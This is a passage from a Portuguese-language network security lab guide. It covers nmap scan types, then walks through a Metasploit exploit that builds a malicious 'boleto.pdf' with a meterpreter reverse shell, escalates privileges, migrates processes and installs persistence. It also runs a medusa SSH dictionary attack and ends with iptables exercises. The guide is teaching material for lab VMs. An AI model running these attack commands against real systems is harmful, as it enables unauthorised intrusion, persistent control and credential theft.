Initiating Parallel DNS resolution of 1 host. at 02:41
Completed Parallel DNS resolution of 1 host. at 02:41, 0.02s elapsed
Initiating SYN Stealth Scan at 02:41
(...)
Completed SYN Stealth Scan at 02:41, 3.07s elapsed (1000 total ports)
Nmap scan report for 172.16.1.20
Host is up (0.000095s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
MAC Address: 08:00:27:F6:50:68 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
           Raw packets sent: 1189 (52.300KB) | Rcvd: 1001 (40.052KB)</pre>
</div>
</div>
<div class="paragraph">
<p>Solicita-se um <em>scan</em> <em>verbose</em> da máquina <em>WinServer-G</em>. Após resolução ARP/DNS, o <code>nmap</code> escaneia as mil portas mais comuns para cada protocolo. Depois, ele relata quais portas foram detectadas como abertas, juntamente com o nome de serviço que usualmente escuta naquela porta.</p>
</div>
<div class="paragraph">
<p>Mas&#8230;&#8203; que mil portas são essas? Elas são definidas no arquivo <code>/usr/share/nmap/nmap-services</code>, que possui grande similaridade com o arquivo <code>/etc/services</code>&#8201;&#8212;&#8201;mas, além de listar o serviço na primeira coluna e porta/protocolo na segunda coluna, há uma terceira coluna que indica a probabilidade que uma dada porta seja encontrada aberta. Essa probabilidade é obtida pela equipe do <code>nmap</code> a partir de <em>scans</em> de pesquisa na Internet ao largo.</p>
</div>
<div class="paragraph">
<p>Por exemplo, para descobrir quais são as dez portas mais populares, basta executar:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /usr/share/nmap/nmap-services | grep -v '^#' | awk '{print $3,$2,$1}' | sort -n | tac | head -n10</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>0.484143 80/tcp http
0.450281 631/udp ipp
0.433467 161/udp snmp
0.365163 137/udp netbios-ns
0.330879 123/udp ntp
0.297830 138/udp netbios-dgm
0.293184 1434/udp ms-sql-m
0.253118 445/udp microsoft-ds
0.244452 135/udp msrpc
0.228010 67/udp dhcps</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, vamos ver o que aparece no Wireshark da máquina <em>WinServer-G</em>:</p>
</div>
<div id="img-nmap-1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nmap-1.png" alt="nmap 1">
</div>
<div class="title">Figure 37. Captura de scan nmap contra a máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Note que uma série de pacotes SYN são enviados para diferentes portas do servidor Windows. Por sua vez, o Windows responde com um ACK se a porta estiver aberta, mas o <code>nmap</code> não envia um SYN/ACK em resposta a esse pacote&#8201;&#8212;&#8201;esse é o modo padrão de <em>scan</em> do <code>nmap</code>, TCP SYN, também conhecido como <em>half-open scan</em>.</p>
</div>
</li>
<li>
<p>Vamos agora explorar outros modos de funcionamento do <code>nmap</code>. Teste os modos: (1) <em>TCP connect scan</em>, (2) <em>TCP NULL scan</em>, (3) <em>TCP FIN scan</em> e (4) <em>TCP Xmas scan</em>, e acompanhe o andamento da varredura de portas através do Wireshark. Procure entender o que está acontecendo e a diferença entre comandos executados, para verificar os conceitos do material teórico.</p>
<div class="admonitionblock tip">
<table>
<tr>
<td class="icon">
<i class="fa icon-tip" title="Tip"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Recomenda-se a leitura da página de manual do <code>nmap</code>, via comando <code>man 1 nmap</code>, para estudar o que cada um desses tipos de <em>scan</em> objetiva. A página de manual do <code>nmap</code> é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.</p>
</div>
<div class="paragraph">
<p>O guia de referência do <code>nmap</code> também possui um capítulo dedicado às diferentes técnicas para <em>port scanning</em>, acessível em <a href="https://nmap.org/book/man-port-scanning-techniques.html" class="bare">https://nmap.org/book/man-port-scanning-techniques.html</a> .</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Respectivamente, os <em>scans</em> do tipo <em>connect</em>, <em>NULL</em>, <em>FIN</em> e <em>Xmas</em> podem ser realizados com os comandos:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -sT 172.16.1.20</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -sN 172.16.1.20</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -sF 172.16.1.20</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -sX 172.16.1.20</pre>
</div>
</div>
</li>
<li>
<p>Outra funcionalidade do <code>nmap</code> é o <em>OS fingerprinting</em>. Utilize a opção que ativa essa verificação nas máquinas virtuais <em>FWGW1-G</em> e <em>WinServer-G</em>. Use o <code>tcpdump</code> e o Wireshark para verificar a troca de pacotes neste processo.</p>
<div class="paragraph">
<p>Primeiro, vamos escanear a máquina <em>FWGW1-G</em>, realizando o <em>OS fingerprinting</em> (opção <code>-O</code>):</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -O 172.16.1.1

(...)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds</pre>
</div>
</div>
<div class="paragraph">
<p>Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 4.9. Vamos verificar se o <code>nmap</code> está correto, logando na máquina <em>FWGW1-G</em> e imprimindo a versão do kernel:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># uname -r
4.9.0-8-amd64</pre>
</div>
</div>
<div class="paragraph">
<p>Perfeito! Vamos partir para o <em>scan</em> da máquina <em>WinServer-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -O 172.16.1.20

(...)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
(...)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds</pre>
</div>
</div>
<div class="paragraph">
<p>A detecção do <code>nmap</code> para o Windows Server 2019, ao que parece, não foi muito precisa. Podemos adicionar a opção <code>--fuzzy</code> à invocação do <code>nmap</code> para obter resultados mais representativos:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># nmap -O --fuzzy 172.16.1.20

(...)
Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1511 (90%), Microsoft Windows Server 2008 R2 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
(...)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds</pre>
</div>
</div>
<div class="paragraph">
<p>Em geral, a assinatura da máquina <em>WinServer-G</em> assemelha-se a um sistema Windows Server 2012-2016. Vamos ver se isso procede:</p>
</div>
<div id="img-nmap-2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nmap-2.png" alt="nmap 2">
</div>
<div class="title">Figure 38. Versão do SO na máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Como podemos observar, o <em>WinServer-G</em> é um Windows Server 2019 Datacenter&#8201;&#8212;&#8201;os resultados no <code>nmap</code> deixam um pouco a desejar, nesse caso.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_6_realizando_um_ataque_com_o_metasploit">6) Realizando um ataque com o Metasploit</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>WinServer-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nessa atividade iremos executar uma série de comandos utilizando o <code>metasploit</code> disponível na máquina <em>KaliLinux-G</em>. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos instalar em servidores programas desnecessários, como visualizadores de PDF.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale o <em>Adobe Reader</em> versão 9.3.4 na máquina <em>WinServer-G</em>. Esse programa pode ser encontrado no AVA, ou na pasta compartilhada via rede pelo instrutor.</p>
</li>
<li>
<p>Agora, vamos gerar um arquivo PDF malicioso para explorar a vulnerabilidade do <em>Adobe Reader</em> instalado no passo (1). Acesse a máquina <em>KaliLinux-G</em> e execute:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A

# msfconsole

msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing

msf exploit(adobe_cooltype_sing) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit(adobe_cooltype_sing) &gt; set FILENAME boleto.pdf
FILENAME =&gt; boleto.pdf

msf exploit(adobe_cooltype_sing) &gt; set LHOST 172.16.1.30
LHOST =&gt; 172.16.1.30

msf exploit(adobe_cooltype_sing) &gt; set LPORT 4444
LPORT =&gt; 4444

msf exploit(adobe_cooltype_sing) &gt; exploit

[*] Creating 'boleto.pdf' file...
[+] boleto.pdf stored at /root/.msf4/local/boleto.pdf</pre>
</div>
</div>
<div class="paragraph">
<p>O que foi feito?</p>
</div>
<div class="openblock">
<div class="content">
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Escolhemos o <em>exploit</em> a ser utilizado&#8201;&#8212;&#8201;no caso, o <code>adobe_cooltype_sing</code>.</p>
</li>
<li>
<p>Selecionamos o <em>payload</em> a ser enviado junto com o arquivo PDF que será gerado&#8201;&#8212;&#8201;<code>windows/meterpreter/reverse_tcp</code>. O <code>reverse_tcp</code> é um <em>payload</em> que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.</p>
</li>
<li>
<p>Selecionamos o nome do arquivo&#8201;&#8212;&#8201;<code>boleto.pdf</code> . Um nome (e conteúdo) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser visualizado.</p>
</li>
<li>
<p>Selecionamos o <em>host</em> local&#8201;&#8212;&#8201;esse é o IP da máquina que iniciará o <em>handler</em> da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina <em>KaliLinux-G</em>, 172.16.1.30.</p>
</li>
<li>
<p>Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria até melhor selecionar uma porta popular, como 80 ou 443, que provavelmente serão liberadas pelo firewall da rede.</p>
</li>
<li>
<p>Finalmente, executamos <code>exploit</code>. No caso particular desse <em>exploit</em>, esse comando produziu o PDF malicioso objetivado, e o gravou no arquivo <code>/root/.msf4/local/boleto.pdf</code>.</p>
</li>
</ol>
</div>
</div>
</div>
</li>
<li>
<p>O próximo passo é disponibilizar o PDF para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado&#8201;&#8212;&#8201;basta copiar o arquivo gerado no passo anterior para a pasta <code>/var/www/html</code>, retirar o arquivo <code>index.html</code> dessa pasta para que a listagem de arquivos seja feita no navegador, e iniciar o serviço. Abra um novo terminal e faça isso:</p>
<div class="literalblock">
<div class="content">
<pre># mv /root/.msf4/local/boleto.pdf /var/www/html/

# mv /var/www/html/index.html /var/www/html/index.html.bak

# systemctl start apache2</pre>
</div>
</div>
</li>
<li>
<p>Agora, vamos fazer o download do arquivo PDF na máquina <em>WinServer-G</em>. Mas, antes disso, no entanto, precisamos iniciar o <em>handler</em> na máquina <em>KaliLinux-G</em>, que irá escutar a conexão TCP reversa:</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A

# msfconsole

msf &gt; use exploit/multi/handler

msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD =&gt; windows/meterpreter/reverse_tcp

msf exploit(handler) &gt; set LHOST 172.16.1.30
LHOST =&gt; 172.16.1.30

msf exploit(handler) &gt; set LPORT 4444
LPORT =&gt; 4444

msf exploit(handler) &gt; exploit

[*] Started reverse handler on 172.16.1.30:4444
[*] Starting the payload handler...</pre>
</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Perfeito, agora sim. Na máquina <em>WinServer-G</em>, acesse a URL <a href="http://172.16.1.30" class="bare">http://172.16.1.30</a> (ajuste o endereço IP se você pertencer ao grupo <code>B</code>). Você deve ver o PDF disponível para download:</p>
<div id="img-metasploit-browser" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/metasploit-browser.png" alt="metasploit browser">
</div>
<div class="title">Figure 39. PDF malicioso disponível para download no browser</div>
</div>
<div style="page-break-after: always;"></div>
</li>
<li>
<p>Faça o download do PDF na máquina <em>WinServer-G</em>&#8201;&#8212;&#8201;será necessário adicionar a máquina <em>KaliLinux-G</em> à lista de <em>Trusted sites</em> do Internet Explorer antes de o download ser permitido. Depois, clique duas vezes no documento. O <em>Adobe Reader</em> irá iniciar, e uma tela vazia será apresentada, como a que se segue:</p>
<div id="img-metasploit-pdf" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/metasploit-pdf.png" alt="metasploit pdf">
</div>
<div class="title">Figure 40. Exploit do Adobe Reader com sucesso</div>
</div>
</li>
<li>
<p>De volta à console do <em>KaliLinux-G</em>, observe que o <em>handler</em> recebeu a conexão reversa e iniciou o <em>meterpreter</em>, um <em>payload</em> avançado que irá permitir-nos controlar a máquina <em>WinServer-G</em> remotamente.</p>
<div class="literalblock">
<div class="content">
<pre>[*] Started reverse handler on 172.16.1.30:4444
[*] Starting the payload handler...
[*] Sending stage (885806 bytes) to 172.16.1.20
[*] Meterpreter session 1 opened (172.16.1.30:4444 -&gt; 172.16.1.20:49173) at 2018-08-18 02:27:47 -0400

meterpreter &gt;</pre>
</div>
</div>
</li>
<li>
<p>Primeiro, vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando <code>getuid</code>, irá notar que o <code>meterpreter</code> está executando como o usuário que abriu o PDF originalmente (provavelmente, o usuário <code>Administrator</code>).</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; getuid
Server username: WINSERVER-A\Administrator</pre>
</div>
</div>
<div class="paragraph">
<p>O Windows possui uma conta com privilégios ainda mais elevados que o <code>Administrator</code>, a conta <code>SYSTEM</code>. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional&#8201;&#8212;&#8201;com efeito, uma espécie de "super-root" do SO. Felizmente, o <code>meterpreter</code> possui o <em>script</em> <code>getsystem</code>, que permite a escalada de privilégio de forma automática:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</pre>
</div>
</div>
</li>
<li>
<p>Se o usuário fechar o Adobe Reader ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando <code>migrate</code> para alterar o binário em que o <code>meterpreter</code> está alojado, de forma que se o usuário fechar o PDF aberto, não perderemos conexão com a máquina. Primeiro, vamos descobrir um processo adequado e então migrar para ele:</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; ps

Process List
============

 PID   PPID  Name              Arch  Session  User                          Path
 ---   ----  ----              ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System            x86   0
 420   4     smss.exe          x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe  456   1040  taskeng.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
 488   476   csrss.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  532   524   csrss.exe         x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe  540   476   wininit.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 568   524   winlogon.exe      x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 616   540   services.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 628   540   lsass.exe         x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  636   540   lsm.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 796   616   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 840   616   VBoxService.exe   x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\VBoxService.exe
 892   616   svchost.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; migrate 796
[*] Migrating from 1932 to 796...
[*] Migration completed successfully.</pre>
</div>
</div>
</li>
<li>
<p>Em seguida, vamos executar o módulo <code>persistence</code> do <code>meterpreter</code>&#8201;&#8212;&#8201;trata-se de um <em>script</em> Ruby que irá criar um serviço do <code>meterpreter</code> que será iniciado assim que a máquina for ligada.</p>
<div class="literalblock">
<div class="content">
<pre>meterpreter &gt; run persistence -X
[*] Running Persistance Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/WINSERVER-A_20180818.3516/WINSERVER-A_20180818.3516.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=172.16.1.30 LPORT=4444
[*] Persistent agent script is 148489 bytes long
[+] Persistent Script written to C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
[*] Executing script C:\Users\ADMINI~1\AppData\Local\Temp\1\jQtfcF.vbs
[+] Agent executed with PID 2576
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BDvTbCcqiyCJEPO</pre>
</div>
</div>
</li>
<li>
<p>Efetivamente, agora a máquina <em>WinServer-G</em> está totalmente dominada. Agora, faça testes com os comandos que se seguem para determinar quais são as possibilidades apresentadas pelo <code>meterpreter</code>&#8201;&#8212;&#8201;sua imaginação é o limite!</p>
<div id="img-meterpreter-commands-p1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/meterpreter-commands-p1.png" alt="meterpreter commands p1">
</div>
<div class="title">Figure 41. Comandos do meterpreter, parte 1</div>
</div>
<div id="img-meterpreter-commands-p2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/meterpreter-commands-p2.png" alt="meterpreter commands p2">
</div>
<div class="title">Figure 42. Comandos do meterpreter, parte 2</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_realizando_um_ataque_de_dicionário_com_o_medusa">7) Realizando um ataque de dicionário com o <strong><em>medusa</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>FWGW1-G</em> e <em>KaliLinux-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos realizar um ataque de força bruta ao serviço SSH utilizando o <code>medusa</code>. Na máquina <em>FWGW1-G</em>, crie um usuário chamado <code>marcelo</code> com a senha <code>123456</code> e outro chamado <code>marco</code> com a senha <code>abacate</code>. Depois, ainda na máquina alvo, monitore o arquivo de log <code>/var/log/auth.log</code> por tentativas de login.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A

# useradd -m marcelo ; echo 'marcelo:123456' | chpasswd
# useradd -m marco ; echo 'marco:abacate' | chpasswd

# tail -f -n0 /var/log/auth.log</pre>
</div>
</div>
</li>
<li>
<p>Na máquina <em>KaliLinux-G</em>, o primeiro passo é descobrir o <em>banner</em> de serviço do SSH. Execute o comando <code>$ nc 172.16.1.1 22</code> (adapte o endereço IP se necessário) e copie o valor mostrado.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
KaliLinux-A

# nc 172.16.1.1 22
SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1</pre>
</div>
</div>
</li>
<li>
<p>Agora, crie dois arquivos&#8201;&#8212;&#8201;um com uma lista de usuários cujo nome será usado para login, e outro com uma lista de senhas. Não se esqueça de incluir na lista de usuários os nomes dos que foram criados no passo (1) desta atividade, bem como suas senhas no outro arquivo.</p>
<div class="literalblock">
<div class="content">
<pre># pwd
/root

# cat users.txt
root
marcelo
marco
silva

# cat passwords.txt
rnpesr
123456
abacate
framboesa</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, use o comando <code>medusa</code> para executar um ataque de dicionário contra a máquina-alvo. Não se esqueça de informar o <em>banner</em> de serviço capturado no passo (2), bem como os arquivos de usuários/senhas criados no passo (3).</p>
<div class="literalblock">
<div class="content">
<pre># medusa -M ssh -m BANNER:SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u1 -h 172.16.1.1 -U users.txt -P passwords.txt | grep 'SUCCESS'
ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marcelo Password: 123456 [SUCCESS]
ACCOUNT FOUND: [ssh] Host: 172.16.1.1 User: marco Password: abacate [SUCCESS]</pre>
</div>
</div>
</li>
<li>
<p>De volta à máquina <em>FWGW1-A</em>, observe o grande número de tentativas de login sem sucesso que o <code>medusa</code> realizou até que tivesse sucesso com os usuários/senhas corretos. Como o administrador de sistemas poderia detectar esse tipo de ataque e bloqueá-lo?</p>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_3_firewall">Sessão 3: Firewall</h2>
<div class="sectionbody">
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>As atividades desta sessão serão realizadas na máquina virtual <em>FWGW1-G</em>, com pequenas exceções apontadas pelo enunciado dos exercícios.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="sect2">
<h3 id="_1_trabalhando_com_chains_no_iptables">1) Trabalhando com <strong><em>chains</em></strong> no <strong><em>iptables</em></strong></h3>
<div class="paragraph">
<p>O Netfilter é um <em>framework</em> provido pelo kernel Linux que permite que várias operações relacionadas à rede sejam implementadas através de <em>handlers</em> customizados. Ele provê diversas funções e operações que permitem filtragem de pacotes, tradução de endereços de rede e portas, bem como a capacidade de proibir que pacotes cheguem a pontos sensíveis da rede.</p>
</div>
<div class="paragraph">
<p>O <code>iptables</code> é a ferramenta em espaço de usuário que permite a gerência do Netfilter. Há vários conceitos centrais ao <code>iptables</code>, como:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Tabelas:</p>
<div class="ulist">
<ul>
<li>
<p><em>Filter</em>: filtragem de pacotes.</p>
</li>
<li>
<p><em>NAT</em>: tradução de endereços.</p>
</li>
<li>
<p><em>Mangle</em>: marcação de pacotes e QoS.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Chains:</p>
<div class="ulist">
<ul>
<li>
<p>INPUT: entrada no firewall propriamente dito.</p>
</li>
<li>
<p>OUTPUT: saída do firewall propriamente dito.</p>
</li>
<li>
<p>FORWARD: passagem através do firewall.</p>
</li>
<li>
<p>PREROUTING: decisões pré-roteamento; presente apenas nas tables <em>NAT</em> e <em>Mangle</em>.</p>
</li>
<li>
<p>POSTROUTING: decisões pós-roteamento; presente apenas nas tables <em>NAT</em> e <em>Mangle</em>.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Alvos:</p>
<div class="ulist">
<ul>
<li>
<p>ACCEPT: aceita o pacote.</p>
</li>
<li>
<p>DROP: descarta o pacote sem informar o remetente.</p>
</li>
<li>
<p>REJECT: rejeita o pacote e notifica o remetente.</p>
</li>
<li>
<p>LOG: loga o pacote nos registros do <code>iptables</code>.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Manipulação de regras:</p>
<div class="ulist">
<ul>
<li>
<p>A: adiciona a regra ao final da <em>chain</em> (<em>append</em>).</p>
</li>
<li>
<p>I: insere a regra no começo da <em>chain</em> (<em>insert</em>).</p>
</li>
<li>
<p>D: apaga a regra (<em>delete</em>).</p>
</li>
<li>
<p>L: listas as regras de uma dada <em>chain</em> (<em>list</em>).</p>
</li>
<li>
<p>P: ajusta a política padrão de uma <em>chain</em> (<em>policy</em>).</p>
</li>
<li>
<p>F: apaga todas as regras da <em>chain</em> (<em>flush</em>).</p>
</li>
</ul>
</div>
</li>
<li>
<p>Padrões de casamento:</p>
<div class="ulist">
<ul>
<li>
<p><code>-s</code>: IP de origem do pacote.</p>
</li>
<li>
<p><code>-d</code>: IP de destino do pacote.</p>
</li>
<li>
<p><code>-i</code>: interface de entrada.</p>
</li>
<li>
<p><code>-o</code>: interface de saída.</p>
</li>
<li>
<p><code>-p</code>: protocolo, que pode ser dos tipos TCP, UDP e ICMP.</p>
</li>
</ul>
</div>
</li>
<li>
<p>Módulos adicionais para casamento de pacotes (<em>extended packet matching modules</em>) podem ser habilitados com a opção <code>-m</code> ou <code>--match</code>. Destacamos:</p>
<div class="ulist">
<ul>
<li>
<p><code>conntrack</code>: quando habilitado, permite acesso ao controle de estados de conexões; normalmente invocado por <code>-m conntrack --ctstate</code> ou para um <em>subset</em> de suas funções, <code>-m state --state</code>. Estados válidos incluem INVALID, NEW, ESTABLISHED, RELATED e UNTRACKED.</p>
</li>
<li>
<p><code>icmp</code>: possibilita filtrar tipos específicos de ICMP, via <em>flag</em> <code>--icmp-type</code>.</p>
</li>
<li>
<p><code>mac</code>: possibilita filtragem por endereço físico de origem, via <em>flag</em> <code>--mac-source</code>.</p>
</li>
<li>
<p><code>multiport</code>: permite especificação de até 15 portas dentro de uma mesma regra, separadas por vírgula, ou um <em>range</em> com a sintaxe <code>porta:porta</code>. Pode-se especificar portas de origem (<code>--sports</code>), destino (<code>--dports</code>) ou ambas (<code>--ports</code>).</p>
</li>
<li>
<p><code>tcp</code>: habilita as opções <code>--source-port</code> (ou <code>--sport</code>), <code>--destination-port</code> (ou <code>--dport</code>), <code>--tcp-flags</code> (<em>flags válidas</em>: SYN, ACK, FIN, RST, URG, PSH, ALL e NONE), <code>--syn</code> e <code>--tcp-option</code> para pacotes TCP.</p>
</li>
<li>
<p><code>udp</code>: habilita as opções <code>--source-port</code> (ou <code>--sport</code>), <code>--destination-port</code> (ou <code>--dport</code>) para pacotes UDP.</p>
</li>
</ul>
</div>
</li>
</ul>
</div>
</div>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, vamos testar a filtragem simples (<em>stateless</em>) no <code>iptables</code>. Faça login na máquina <em>FWGW1-G</em> como <code>root</code> e mude a política padrão da <em>chain</em> OUTPUT para DROP. Em seguida, tente conectar-se à porta 80/HTTP de um host remoto na Internet. É possível?</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -P OUTPUT DROP</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca: forward host lookup failed: Host name lookup failure : Resource temporarily unavailable</pre>
</div>
</div>
</li>
<li>
<p>Agora, crie uma regra na <em>chain</em> OUTPUT que permita a saída de pacotes na porta 80/HTTP (não se esqueça também de permitir consultas DNS à porta 53/UDP, se estiver utilizando um nome e não um endereço IP) e tente conectar-se novamente. Qual o resultado?</p>
<div class="literalblock">
<div class="content">
<pre># iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
# iptables -A OUTPUT -p udp --dport 53 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
</li>
<li>
<p>Mude a política padrão da <em>chain</em> INPUT também para DROP. Ainda é possível conectar-se?</p>
<div class="literalblock">
<div class="content">
<pre># iptables -P INPUT DROP</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
Host name lookup failure</pre>
</div>
</div>
<div class="paragraph">
<p>Apesar de o resultado parecer o mesmo obtido anteriormente, há uma diferente substancial&#8201;&#8212;&#8201;as requisições DNS/HTTP estão sendo enviado com sucesso, porém a resposta de retorno está sendo bloqueada. Rode o <code>tcpdump</code> em outra sessão e monitore a interface de rede de saída (<code>enp0s3</code>), filtrando apenas por pacotes oriundos/destinados ao IP dessa interface, enquanto o comando <code>nc</code> acima é executado. A requisição DNS e enviada e sua resposta retorna, porém é descartada pelo kernel.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ip a s enp0s3 | grep '^ *inet ' | awk '{print $2}'
192.168.29.107/24</pre>
</div>
</div>
